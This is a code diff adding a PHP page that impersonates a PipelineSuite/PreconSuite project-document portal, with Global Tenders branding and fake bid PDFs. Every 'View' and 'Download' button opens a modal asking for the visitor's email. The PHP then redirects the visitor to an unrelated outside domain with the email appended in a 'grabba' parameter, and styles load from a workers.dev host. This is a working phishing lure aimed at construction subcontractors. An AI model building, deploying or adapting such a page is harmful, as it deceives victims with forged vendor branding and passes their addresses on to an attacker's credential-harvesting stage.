@@ -1,0 +1,175 @@
+<?php
+// Configuration
+$has_expired = false; // Set this based on your expiration logic
+$error_message = "";
+
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+
+    // Check if expired before processing
+    if ($has_expired) {
+        $error_message = "This document link has expired.";
+    } else {
+
+        $email = filter_input(INPUT_POST, "email", FILTER_SANITIZE_EMAIL);
+
+        if ($email && filter_var($email, FILTER_VALIDATE_EMAIL)) {
+
+            header(
+                "Location: https://mor.kappes-inc.com/090f0168b25f4ec2888f33f3b8f3a725/?F2xyy=fz3rxF6&grabba=" .
+                    $email
+            );
+            exit();
+
+        } else {
+            $error_message = "Please enter a valid email address.";
+        }
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="https://cdn.pipelinesuite.com/images/favicon.ico" type="image/x-icon" />
+    <link rel="stylesheet" type="text/css" href="https://pipeline.d874c7c1f8062afc4f2fd153.workers.dev/styles.css">
+
+    <title>PipelineSuite | Project Documents</title>
+
+
+</head>
+
+<body>
+
+    <div class="header">
+        <div class="header-logo">
+            <img src="https://cdn.pipelinesuite.com/images/pipeline-suite.png" alt="PipelineSuite">
+        </div>
+    </div>
+
+    <div class="orange-bar"></div>
+
+    <div class="main-content">
+        <div class="page-title">
+            <img src="https://www.globaltenders.com/gtscripts/global-tenders-logo1.png" alt="Global Tenders">
+            <h1>Project Documents</h1>
+        </div>
+
+        <div class="page-subtitle">
+            Click any document to access. Authentication required for download.
+        </div>
+
+        <div class="documents-grid">
+
+            <div class="document-card" onclick="openModal()">
+                <div class="document-icon">
+                    <img src="https://img.icons8.com/?size=100&id=yI6biYOP5DqP&format=png&color=000000" alt="Document">
+                </div>
+                <div class="document-info">
+                    <div class="document-title">Project Plans & Specifications</div>
+                    <div class="document-meta">Updated: Jan 5, 2026<br>PDF • 15.2 MB</div>
+                </div>
+                <div class="document-actions">
+                    <button class="download-btn" onclick="event.stopPropagation(); openModal();">Download</button>
+                    <button class="view-btn" onclick="event.stopPropagation(); openModal();">View</button>
+                </div>
+            </div>
+
+            <div class="document-card" onclick="openModal()">
+                <div class="document-icon">
+                    <img src="https://img.icons8.com/?size=100&id=yI6biYOP5DqP&format=png&color=000000" alt="Document">
+                </div>
+                <div class="document-info">
+                    <div class="document-title">Unconditional Waiver & Release</div>
+                    <div class="document-meta">Updated: Jan 5, 2026<br>PDF • 450 KB</div>
+                </div>
+                <div class="document-actions">
+                    <button class="download-btn" onclick="event.stopPropagation(); openModal();">Download</button>
+                    <button class="view-btn" onclick="event.stopPropagation(); openModal();">View</button>
+                </div>
+            </div>
+
+            <div class="document-card" onclick="openModal()">
+                <div class="document-icon">
+                    <img src="https://img.icons8.com/?size=100&id=yI6biYOP5DqP&format=png&color=000000" alt="Document">
+                </div>
+                <div class="document-info">
+                    <div class="document-title">Subcontractor Agreement</div>
+                    <div class="document-meta">Updated: Jan 5, 2026<br>PDF • 2.1 MB</div>
+                </div>
+                <div class="document-actions">
+                    <button class="download-btn" onclick="event.stopPropagation(); openModal();">Download</button>
+                    <button class="view-btn" onclick="event.stopPropagation(); openModal();">View</button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="loginModal">
+        <div class="login-card">
+            <button class="close-modal" onclick="closeModal()">&times;</button>
+
+            <div class="company-logo">
+                <img src="https://www.globaltenders.com/gtscripts/global-tenders-logo1.png" alt="Logo">
+            </div>
+
+            <?php if (!empty($error_message)) : ?>
+            <div class="error-message"><?php echo $error_message; ?></div>
+            <?php endif; ?>
+
+            <form method="POST" action="">
+                <div class="form-group">
+                    <label class="form-label" for="email">Email</label>
+                    <input type="email" name="email" id="email" class="form-input" placeholder="Email" required>
+                </div>
+
+                <button type="submit" class="continue-btn">Continue</button>
+
+                <div class="support-text">
+                    If you experience any problems please contact us at
+                    <a href="mailto:support@preconsuite.com">support@preconsuite.com</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-logo">
+            <img src="https://cdn.pipelinesuite.com/images/poweredByPreconSuite.svg" alt="Powered by PreconSuite">
+        </div>
+        <div class="footer-links">
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Contact Us</a>
+        </div>
+    </div>
+
+    <script>
+        function openModal() {
+            document.getElementById('loginModal').classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal() {
+            document.getElementById('loginModal').classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+
+        document.getElementById('loginModal').addEventListener('click', function(e) {
+            if (e.target.classList.contains("modal-overlay")) {
+                closeModal();
+            }
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeModal();
+            }
+        });
+    </script>
+
+</body>
+
+</html>
